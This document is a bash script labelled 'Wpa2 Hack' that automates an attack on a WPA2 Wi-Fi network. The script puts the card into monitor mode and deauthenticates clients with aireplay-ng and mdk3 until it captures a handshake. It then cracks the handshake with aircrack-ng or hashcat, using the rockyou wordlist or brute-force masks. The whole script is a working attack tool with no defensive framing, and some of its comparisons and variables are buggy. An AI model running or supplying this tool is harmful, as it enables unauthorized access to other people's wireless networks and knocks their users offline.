#!/bin/bash


Color() {

res="\033[0m"
b='\033[0;30m'
r='\033[0;31m'
g='\033[0;32m'
y='\033[0;33m'
p='\033[0;34m'
c='\033[0;36m'
w='\033[0;37m'



}



Banner() {
	echo -e $c
cat<< EOF

'|| '||'  '|'                          '||'  '||'                 '||      
 '|. '|.  .'  ... ...   ....    /\      ||    ||   ....     ....   ||  ..  
  ||  ||  |    ||'  || '' .||  (  )     ||''''||  '' .||  .|   ''  || .'   
   ||| |||     ||    | .|' ||    //     ||    ||  .|' ||  ||       ||'|.   
    |   |      ||...'  '|..'|'  //     .||.  .||. '|..'|'  '|...' .||. ||. 
               ||              /(                                          
              ''''             {___                                        
           	
EOF
echo -e $r"   	Coded BY$c::::::::::$r["AhmedBalaha:"]"
echo -e $r"        Verison$c::::::::::$r["1.0"]"
echo -e $g "       01010101010101010101"
echo -e $g "       Start Attack Wpa2 > Using STRIK METHOD >> 010101"
echo -e $c "       Run PMKID Attack On AP %100 " 
echo -e $g "       Run Scripts To Crack Wpa2 With HMLASH Cracking USing Dev METHOD </>"
sleep 4
echo -e $res


read 


}



banner() {

echo -e $p"------------------------------------------------------------------------"
echo -e $g "			::Wpa2 Hack::"  
echo -e $p"------------------------------------------------------------------------"

}

clear
Color
Banner
banner
Drive="wlx983f9f25deec"
HANDSHAKE="/root/Handshake/Handshake-01.cap"
Dir="/root/Handshake"
WordList="/usr/share/wordlists/rockyou.txt"

gunzip $WordList>/dev/null 2>&1
echo -e -n $r"["$y"~"$r"] "$res
echo -e -n $c"Checking ==> Rockyou.txt ..." $res
echo
sleep 2
if [ -f $WordList ]; then
	echo -e -n $r"["$y"~"$r"] "$res
	echo -e $c"Loaded Wordlist ==> /usr/share/wordlists/rockyou.txt"
	sleep 3
	

else
	echo  -e $c":::::::::::::::::::::::::::::::::::::::::::::::"
	echo  -e $r"[-]" $w"/usr/share/wordlists/rockyou.txt [Not Found] $res"
	echo
	echo -e -n "Insert rockyou Path $r[$y~$r]:  " $res
	read  WordList

	
	
fi

Distro=$(head -1 /etc/os-release | cut -f 2 -d '=' )
echo -e -n $r"["$y"~"$r"] "$res
echo -n -e $c"Checking Distro.... " $res
sleep 2
dis=$(python -c "import platform;print(platform.dist()[0])")
echo -e "[$g$dis$res]"
sleep 2
echo
if [ "$Distro"=="LinuxMint" ]; then
	check_drive=$(airmon-ng | grep $Drive )
	Stat=$?
	if [ $Stat -eq 0 ];
	then 
	int=$Drive
	mon="wlan0mon"

else
	int="wlo1"
	mon="wlo1mon"

fi
	airmon-ng | grep wlan0mon >/dev/null
	Mon_Stat=$?
	if [ $Mon_Stat -eq 0 ]; then
		mon="wlan0mon"
	

fi
if [ "$Distro"=="Kali" ] || [ "$Distro"=="Parrot"] ; then
	int="wlan0"
	mon="wlan0mon"

fi
fi

AP_Search() {

 
airmon-ng | grep mon >/dev/null
Status=$?
if [ $Status -eq 0 ]; then
	echo -e -n $r"["$y"~"$r"] "$res
	echo -e $y"Mointor Mode Is On"$res
	echo

else
echo -e -n $r"["$y"~"$r"] "$res
echo -e $r"Start Mointor Mode on $g $int ...." $res
echo
airmon-ng start $int >/dev/null 
fi

trap
sleep 3
echo
echo -e -n $r"["$y"~"$r"] "$res
echo -e $g"Press [Ctrl+C] To Stop"
sleep 2
airodump-ng $mon
banner
echo "Insert The Network Bssid"
echo -e -n $r"["$y"~"$r"]: "$res
read  bssid
clear
banner
echo -n "Insert The Network Channel"
echo -e -n $r"["$y"~"$r"]: "$res
read  Channel
echo

}


Run_Config() {
	if [ -d $Dir ];
	then
		rm -rf $Dir >/dev/null 2>&1
		mkdir $Dir>/dev/null 2>&1

		
	else
		mkdir $Dir>/dev/null 2>&1
	
	fi
	
	cd $Dir
	Cap="Handshake"
	xterm -e airodump-ng -c $Channel --bssid $bssid -w $Cap $mon 2>/dev/null &
	clear
	echo -e $c"-----------------------------------------------------------------------"$res
	echo -e $c"Running Handshake Snoper...."$res $g" BSSID/"$r$bssid$res$g"  Channel/"$r$Channel$res
	echo -e $c"-----------------------------------------------------------------------"$res
	Cap=$Cap+"-01.cap"
	sleep 5
	while true;do
		xterm -fg blue  -bg black -fa 'Monospace' -fs 11 -e aireplay-ng  -0 6 -a $bssid $mon 2>/dev/null 
		sleep 3
		cowpatty -c -r $HANDSHAKE >/dev/null 2>&1
		Stat=$?
		if [ $Stat -eq 0 ] ;then
			pkill airodump-ng
		    break
		    
		else
			sleep 6
			echo > blacklist.txt $bssid
			xterm -e mdk3 $mon d -b blacklist.txt &
			sleep 15
			pkill mdk3
			sleep 3
			cowpatty -c -r $HANDSHAKE >/dev/null 2>&1
			Stat=$?
			if [ $Stat -eq 0 ] ;then
				break
				

			else
				sleep 4
				continue
			
			fi
			

		fi
	done


}



STARS(){

	a=0
	while [ $a -lt 20 ];do
	echo -n -e $r"*"
	a=$[$a+1]
	done
	echo
	echo -e $c "!! G00D Luck !! "
	exit


}


Crack(){
	echo 
	echo -e $g"[+]$c Handshake Snoper" $r"Attack Completed"
	sleep 6
	clear
	echo -e $r ++++++++++++++++++++++++++++++++++++
	echo 
	echo -e $g"[1] Crack With Rockyou Aircrack-ng
[2] Crack With Hashcat Rockyou
[3] Crack With Brute-Force Attack
"
echo
echo -e $r  ++++++++++++++++++++++++++++++++++++

echo -e -n $r"["$y"~"$r"]: "$res

read CRACKMETHOD

if [ $CRACKMETHOD==1 ];then
	xterm  -e aircrack-ng -w $WordList $HANDSHAKE &
	STARS



elif [ $CRACKMETHOD==2 ];then
    xterm -e aircrack-ng -J $HANDSHAKE convert   2>/dev/null
    hccap='convert.hccap'
    xterm -fg green  -bg black -fa 'Monospace' -fs 11 -e hashcat -m 2500 $hccap $WordList 2>/dev/null &

	STARS

elif [ $CRACKMETHOD==3 ];then
	echo $g -e "

Numbered passwords   						    (?d?d?d?d?d?d?d?d)
Letter passwords All uppercase   				    (?u?u?u?u?u?u?u?u)
Letter passwords All lowercase    				    (?l?l?l?l?l?l?l?l)
Passwords Lowercase letters and numbers  			    (?l?d?l?d?l?d?l?d)
Passwords Uppercase letters and numbers  			    (?u?d?u?d?u?d?u?d)
Passwords Mixed uppercase, lowercase, number + special characters   (?a?a?a?a?a?a?a?a)
" $res

	echo -e -n $r"["$y"~"$r"] "$res
	echo -e -n $p"Insert Mask"
	read MASK 
	echo 

	xterm -e aircrack-ng -J $HANDSHAKE convert   2>/dev/null

    xterm -fg green  -bg black -fa 'Monospace' -fs 11 -e hashcat -m 2500 -a 3 $hccap $Mask & 

	STARS

fi
}


AP_Search
Run_Config
Crack
